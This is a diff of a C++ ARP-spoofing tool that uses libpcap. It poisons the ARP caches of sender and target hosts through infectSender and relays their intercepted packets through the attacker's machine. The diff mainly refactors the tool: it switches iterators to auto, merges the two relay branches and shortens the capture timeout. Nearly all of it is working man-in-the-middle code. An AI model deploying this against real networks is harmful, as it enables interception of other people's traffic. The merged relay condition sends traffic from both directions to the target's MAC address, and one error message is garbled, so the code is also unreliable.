@@ -35,7 +35,6 @@ void getMacAddresses(IN pcap_t *handle, OUT ArpSession *arpSession) {
 // relay packet thread
 void relayPacket(IN pcap_t *handle, IN std::vector<ArpSession> arpSessions) {
     int idx;
-    std::vector<ArpSession>::iterator arpSessionIterator;
 
     while(1) {
         struct pcap_pkthdr *pcapHeader;
@@ -49,21 +48,10 @@ void relayPacket(IN pcap_t *handle, IN std::vector<ArpSession> arpSessions) {
         EthernetStructure *ethernetPacket = (EthernetStructure *)packet;
 
         // relay packet
-        for(arpSessionIterator = arpSessions.begin(); arpSessionIterator != arpSessions.end(); arpSessionIterator++) {
-            // Sender -> Target (Sender -> Attacker -> Target)
-            if(ethernetPacket->sourceMacAddress      == arpSessionIterator->senderMacAddress
-            && ethernetPacket->destinationMacAddress == localMacAddress) { // A -> R -> B
-                printf("[*] Relay Packet\n");
-                ethernetPacket->destinationMacAddress = arpSessionIterator->targetMacAddress;
-                ethernetPacket->sourceMacAddress      = localMacAddress;
-                if(pcap_sendpacket(handle, packet, pcapHeader->caplen)) {
-                    fprintf(stderr, "[-] Failed to send relay packet\n");
-                    break;
-                }
-            } else
-            // Target -> Sender (Target -> Attacker -> Sender)
-            if(ethernetPacket->sourceMacAddress      == arpSessionIterator->targetMacAddress
-            && ethernetPacket->destinationMacAddress == localMacAddress) { // A <- R <- B
+        for(auto arpSessionIterator = arpSessions.begin(); arpSessionIterator != arpSessions.end(); arpSessionIterator++) {
+            if((ethernetPacket->sourceMacAddress      == arpSessionIterator->targetMacAddress  // Target -> Sender (Target -> Attacker -> Sender) 
+             || ethernetPacket->sourceMacAddress      == arpSessionIterator->senderMacAddress) // Sender -> Target (Sender -> Attacker -> Target)
+             && ethernetPacket->destinationMacAddress == localMacAddress) {
                 printf("[*] Relay Packet\n");
                 ethernetPacket->destinationMacAddress = arpSessionIterator->targetMacAddress;
                 ethernetPacket->sourceMacAddress      = localMacAddress;
@@ -104,9 +92,7 @@ int main(int argc, char* argv[]) {
     int ret = EXIT_FAILURE;
     pcap_t *handle = NULL;
     std::vector<ArpSession> arpSessions;
-    std::vector<ArpSession>::iterator sessionIterator;
     std::vector<std::thread> threads;
-    std::vector<std::thread>::iterator threadIterator;
     std::thread relayThread;
     struct in_addr laddr;
 
@@ -124,7 +110,7 @@ int main(int argc, char* argv[]) {
     threads.reserve((argc-2) >> 1);
 
     // get packet using pcap library
-    if(!(handle = pcap_open_live(argv[1], BUFSIZ, 1, 1024, errbuf))) {
+    if(!(handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf))) {
         fprintf(stderr, "[-] couldn't open devicnetinet/if_ether.he %s: %s\n", argv[1], errbuf);
         goto end;
     }
@@ -160,12 +146,12 @@ int main(int argc, char* argv[]) {
     }
 
     // initialize Get Mac Address Thread
-    for(sessionIterator = arpSessions.begin(); sessionIterator != arpSessions.end(); sessionIterator++) {
+    for(auto sessionIterator = arpSessions.begin(); sessionIterator != arpSessions.end(); sessionIterator++) {
         threads.emplace_back(getMacAddresses, handle, &(*sessionIterator));
     }
 
     // wait to find MAC Address
-    for(threadIterator=threads.begin(); threadIterator != threads.end(); threadIterator++) {
+    for(auto threadIterator=threads.begin(); threadIterator != threads.end(); threadIterator++) {
         (*threadIterator).join();
     }
     threads.clear();
@@ -175,7 +161,7 @@ int main(int argc, char* argv[]) {
 
     // Spoofing MAC Address
     printf("[*] 3. ARP Spoofing\n");
-    for(sessionIterator = arpSessions.begin(); sessionIterator != arpSessions.end(); sessionIterator++) {
+    for(auto sessionIterator = arpSessions.begin(); sessionIterator != arpSessions.end(); sessionIterator++) {
         infectSender(handle, localMacAddress, *sessionIterator);
     }
 
